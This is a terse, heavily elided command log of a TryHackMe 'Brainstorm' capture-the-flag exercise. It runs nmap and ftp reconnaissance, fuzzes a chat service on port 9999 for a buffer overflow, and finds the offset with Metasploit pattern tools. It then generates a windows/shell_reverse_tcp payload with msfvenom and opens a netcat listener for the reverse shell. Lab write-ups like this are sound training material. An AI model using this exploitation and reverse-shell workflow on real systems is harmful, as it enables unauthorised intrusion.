...
```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ sudo nmap -A -sS -sC -sV -O -Pn 10.10.170.214
...
```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ ftp 10.10.170.214
...
```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ nc 192.168.178.56 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):
```

```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ python -c 'print "A" *5000'
...
```
bibo318@parrot:~$ nc 192.168.178.56 9999
Welcome to Brainstorm chat (beta)
...
```
bibo318@parrot:~$ msf-pattern_create -l 5000
...
```
bibo318@parrot:~$ msf-pattern_offset -l 5000 -q 31704330
...
```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.178.52 LPORT=9001 -b "\x00" -f c
...
```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ nc -lnvp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Brainstorm$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.106.222 LPORT=9001 -b "\x00" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
